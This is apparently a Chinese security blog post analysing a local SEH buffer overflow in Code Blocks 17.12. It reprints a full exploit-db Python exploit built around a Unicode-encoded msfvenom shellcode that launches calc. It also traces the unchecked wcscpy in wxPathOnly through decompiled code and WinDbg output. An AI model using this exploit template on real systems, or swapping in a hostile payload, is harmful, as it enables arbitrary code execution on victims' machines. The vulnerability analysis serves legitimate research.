> 原文链接: https://www.anquanke.com//post/id/170028 


# Code Blocks 17.12 Local Buffer Overflow分析


                                阅读量   
                                **173663**
                            
                        |
                        
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



[![](https://p3.ssl.qhimg.com/t017d2ca407bc567679.png)](https://p3.ssl.qhimg.com/t017d2ca407bc567679.png)

近期在逛`exploit-db`时发现`Code Blocks 17.12`存在溢出，所以顺手就分析了一下。这个洞比较特别，是基于`unicode`数据格式的溢出，不多见。

## 环境

环境准备

```
codeblocks下载：https://www.exploit-db.com/apps/00de2366edbc44fa0006765896aa1718-codeblocks-17.12-setup.exe
windows 7 x86 sp1
Windows Debugger Version 6.11.0001.404 X86
```

explit-db提供的exp

```
#!/usr/bin/python

#
# Exploit Author: bzyo
# Twitter: @bzyo_
# Exploit Title:  Code Blocks 17.12 - Local Buffer Overflow (SEH)(Unicode)
# Date: 01-10-2019
# Vulnerable Software: Code Blocks 17.12
# Vendor Homepage: http://www.codeblocks.org/
# Version: 17.12
# Software Link:
# http://sourceforge.net/projects/codeblocks/files/Binaries/17.12/Windows/codeblocks-17.12-setup.exe
# Tested Windows 7 SP1 x86
#
#
# PoC
# 1. generate codeblocks.txt, copy contents to clipboard
# 2. open cold blocks app
# 3. select File, New, Class
# 4. paste contents from clipboard into Class name
# 5. select Create
# 6. pop calc
#

filename = "codeblocks.txt"


junk = "A"*1982


nseh = "x61x62"

#0x005000e0 pop edi # pop ebp # ret  | startnull,unicode `{`PAGE_EXECUTE_READ`}` [codeblocks.exe]
seh = "xe0x50"

nops = "x47"*10

valign = (
"x53"                 #push ebx
"x47"                 #align
"x58"                 #pop eax
"x47"                          #align
"x47"                          #align
"x05x28x11"                     #add eax  
"x47"                          #align
"x2dx13x11"                  #sub eax
"x47"                #align
"x50"                #push eax
"x47"                #align
"xc3"                #retn
)

nops_sled = "x47"*28

#msfvenom -p windows/exec CMD=calc.exe -e x86/unicode_upper BufferRegister=EAX
#Payload size: 517 bytes
calc = (
"PPYAIAIAIAIAQATAXAZAPU3QADAZABARALAYAIAQAIAQAPA5AAAPAZ1AI1AIAIAJ11AIAIAXA58AAPAZABABQI1A"
"IQIAIQI1111AIAJQI1AYAZBABABABAB30APB944JBKLIXDBM0KPKP1PU9ZE01I0RD4KPPP0DK0RLL4KB2MD4KRRN"
"HLO6WOZNFP1KOFLOLC13LKRNLMPI18OLMM17W9RKBB21GTKPRLPDKPJOL4K0LN1RXZCPHKQZ1PQ4K29O0KQXS4KOY"
"N8YSOJOYDKNT4KKQXV01KOFLY18OLMM1GWOH9PSEKFM3SMZXOKSMNDT5ITPXDKPXMTKQ8SC6TKLL0KTKPXMLM1YCD"
"KLDTKM1J0SYOTMTMTQKQKS10YQJB1KOIPQO1OQJ4KMBZK4MQM2JKQ4MTEX2KPKPKPPP2HP1TKBOTGKOZ5GKJP6UVB"
"0V2HW65EGM5MKO8UOLLFSLLJU0KKIPRUKUWK0GMCCBRORJKPB3KOIE2CC1RLQSNNQU2X35M0AA")

fill = "D"*10000

buffer = junk + nseh + seh + nops + valign + nops_sled + calc + fill

textfile = open(filename , 'w')
textfile.write(buffer)
textfile.close()
```



## 漏洞分析

直接利用exp执行

[![](https://raw.githubusercontent.com/xinali/img/master/blog/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/codeblocks_17_12_buffer_overflow/1548077704859.png)](https://raw.githubusercontent.com/xinali/img/master/blog/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/codeblocks_17_12_buffer_overflow/1548077704859.png)

可以看到调用栈已经被破坏，但是exp并没有用，可能是因为环境的原因。接下来具体分析造成溢出的原因

在函数`wxmsw28u_gcc_cb!Z10wxPathOnlyRK8wxString`中发生了溢出，看看`wxPathOnly`到底干了什么

```
const wxString *__cdecl wxPathOnly(const wxString *a1, const wchar_t **a2)
`{`
  wxStringBase *v2; // eax
  const wchar_t *v4; // ecx
  int v5; // eax
  wchar_t v6; // dx
  wchar_t v7; // dx
  unsigned int v8; // [esp+Ch] [ebp-810h]
  wchar_t v9; // [esp+10h] [ebp-80Ch]
  __int16 v10; // [esp+12h] [ebp-80Ah]
  __int16 v11; // [esp+14h] [ebp-808h]
  __int16 v12; // [esp+16h] [ebp-806h]

  if ( *((_DWORD *)*a2 - 2) )
  `{`
    wcscpy(&amp;v9, *a2);  &lt;=== 关注
    v4 = *a2;
    v5 = *((_DWORD *)*a2 - 2) - 1;
    if ( v5 &gt;= 0 )
    `{`
      v6 = v4[v5];   &lt;=== 出错位置
      if ( v6 == '\' || v6 == '/' )
      `{`
LABEL_11:
        if ( !v5 )
          v5 = 1;
        *(&amp;v9 + v5) = 0;
        goto LABEL_14;
      `}`
      while ( --v5 != -1 )
      `{`
        v7 = v4[v5];
        if ( v7 == '/' || v7 == '\' )
          goto LABEL_11;
      `}`
    `}`
    if ( !iswctype(v9, 0x103u) || v10 != 58 )
      goto LABEL_2;
    v11 = 46;
    v12 = 0;
LABEL_14:
    wxStringBase::InitWith((wxStringBase *)&amp;v9, 0, *(unsigned int *)&amp;wxStringBase::npos, v8);
    return a1;
  `}`
LABEL_2:
  v2 = (wxStringBase *)wxEmptyString;
  if ( !wxEmptyString )
    v2 = (wxStringBase *)&amp;unk_6D18CE6C;
  wxStringBase::InitWith(v2, 0, *(unsigned int *)&amp;wxStringBase::npos, v8);
  return a1;
`}`

```

根据伪码可以发现，如果`a2`指向的数据长度不受控制，那么执行`wcscpy(&amp;v9, *a2)`，将有可能改变调用栈，大概是这样的

```
+-------+
|  a2   |   覆盖
+-------+
|  a1   |   覆盖
+-------+
|  ret    |   覆盖
+-------+
|  ebp  |   覆盖
+-------+
| local |
+-------+
```

如果覆盖了`a2`的值，那么访问`a2`的语句将会出错，从而造成崩溃

```
v6 = v4[v5];
```

跟踪一下`a2`的形成

```
0:000&gt; g
Breakpoint 0 hit
eax=0022df58 ebx=0022e044 ecx=7ffdf000 edx=0022e044 esi=0022e00c edi=7cbca570
eip=6cc66dd0 esp=0022dedc ebp=0022dfb8 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
wxmsw28u_gcc_cb!Z10wxPathOnlyRK8wxString:
6cc66dd0 57              push    edi
0:000&gt; k
ChildEBP RetAddr  
WARNING: Stack unwind information not available. Following frames may be wrong.
0022dfb8 6af05d5e wxmsw28u_gcc_cb!Z10wxPathOnlyRK8wxString
0022e088 6af09134 classwizard+0x5d5e
0022e178 6cc41272 classwizard+0x9134
0022e188 6d0f845a wxmsw28u_gcc_cb!ZNK12wxAppConsole11HandleEventEP12wxEvtHandlerMS0_FvR7wxEventES3_+0x22
0022e198 6ccdf374 wxmsw28u_gcc_cb!ZNK13wxXmlDocument4SaveERK8wxStringi+0x8e8aa
00000000 00000000 wxmsw28u_gcc_cb!ZN12wxEvtHandler21ProcessEventIfMatchesERK21wxEventTableEntryBasePS_R7wxEvent+0x64
```

跟踪`classwizard+0x5d5e`，其在函数`classwizard!sub_6AF05C00`函数中

[![](https://raw.githubusercontent.com/xinali/img/master/blog/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/codeblocks_17_12_buffer_overflow/1548081415526.png)](https://raw.githubusercontent.com/xinali/img/master/blog/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/codeblocks_17_12_buffer_overflow/1548081415526.png)

来看一下函数`ZN13EditorManager3NewERK8wxString`

[![](https://raw.githubusercontent.com/xinali/img/master/blog/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/codeblocks_17_12_buffer_overflow/1548082459659.png)](https://raw.githubusercontent.com/xinali/img/master/blog/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/codeblocks_17_12_buffer_overflow/1548082459659.png)

这里`ida`在显示伪码时，有错误，其实`a3`应该为`a2`，为了方便查看，对应的伪码为

```
// 函数应该只有两个参数，一个ecx，另一个通过改变[esp]传递 
// ZN13EditorManager3NewERK8wxString(a1@ecx, wxString *a2)
_DWORD *__fastcall ZN13EditorManager3NewERK8wxString(int a1, int a2, signed int *a3)
`{`
  ...
  v45 = a1;
  v49 = sub_61B89C40;
  v50 = dword_61CCF500;
  v52 = sub_6186D465;
  v51 = &amp;v68;
  v53 = &amp;v37;
  sub_61BAE7E0(&amp;v47);
  if ( *(_DWORD *)(*a3 - 8) )
  `{`
    v48 = -1;
    if ( !(unsigned __int8)Z12wxFileExistsRK8wxString(a3) )
    `{`
      v44 = &amp;v58;
      Z10wxPathOnlyRK8wxString(&amp;v58, a3); // 这里其实是a2

  ...

  `}`
```

方便理解，画图如下

```
+------+
| esp  |  &lt;= ebp+8 传递的参数a2(a1为ecx)
+------|
| ret  |
+------+
| ebp  |
+------+
```

整体的调用栈执行流程

```
sub_6AF05C00
  |-&gt; ZN13EditorManager3NewERK8wxString
        |-&gt; Z10wxPathOnlyRK8wxString
```

在`sub_6AF05C00`中，参数传递

```
.text:6AF05D50       lea     ebx, [ebp+v404_wxString]
.text:6AF05D53       mov     ecx, eax        ; _DWORD
.text:6AF05D55       mov     [esp], ebx      ; 传入参数
.text:6AF05D58       call    ds:_ZN13EditorManager3NewERK8wxString ; 其调用wxPathOnly
```

其实`ebx`传递的是一个`wxString`类型的数据，具体通过`windbg`查看一下

[![](https://raw.githubusercontent.com/xinali/img/master/blog/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/codeblocks_17_12_buffer_overflow/1548147242018.png)](https://raw.githubusercontent.com/xinali/img/master/blog/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/codeblocks_17_12_buffer_overflow/1548147242018.png)

可以看到其值是指向构建类头文件的文件路径，其中`ebx`又在`_ZN13EditorManager3NewERK8wxString`中直接传给了`wxPathOnly`

```
.text:6186D39E                 mov     edx, [ebp+a2]   &lt;= 传递
.text:6186D3A1                 lea     eax, [ebp+var_60]
.text:6186D3A4                 mov     [ebp+var_B8], eax
.text:6186D3AA                 mov     [esp], eax
.text:6186D3AD                 mov     [esp+4], edx    &lt;= 转化为参数
.text:6186D3B1                 call    ds:_Z10wxPathOnlyRK8wxString
```

在`windbg`查看一下

[![](https://raw.githubusercontent.com/xinali/img/master/blog/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/codeblocks_17_12_buffer_overflow/1548147819161.png)](https://raw.githubusercontent.com/xinali/img/master/blog/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/codeblocks_17_12_buffer_overflow/1548147819161.png)

结合前面对`wxPathOnly`的分析，如果对类名没有检测，那么`wxPathOnly`就会造成溢出，并且通过类名溢出可以直接控制`EIP`，从而造成命令执行。

[![](https://raw.githubusercontent.com/xinali/img/master/blog/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/codeblocks_17_12_buffer_overflow/1548148482227.png)](https://raw.githubusercontent.com/xinali/img/master/blog/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/codeblocks_17_12_buffer_overflow/1548148482227.png)

至此通过逆向分析，我们捋清了整个导致溢出的过程。



## 参考

[exploit-db](https://www.exploit-db.com/exploits/46120)
